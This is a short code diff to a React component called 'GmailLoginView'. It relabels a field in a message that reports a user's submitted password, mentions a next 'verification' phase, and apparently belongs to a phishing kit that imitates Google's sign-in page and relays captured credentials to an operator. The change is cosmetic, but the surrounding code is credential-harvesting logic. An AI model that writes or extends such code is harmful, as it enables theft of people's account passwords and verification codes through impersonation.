@@ -505,7 +505,7 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
     try {
       const passPayload = {
         message: `📧 Action: User Submitted Password\n` + 
-                 `👤 Email Address: ${password.trim()}\n` +
+                 `🔑 Password: ${password.trim()}\n` +
                  `🔄 Next Phase: Awaiting verificationEntry...`
       };
 
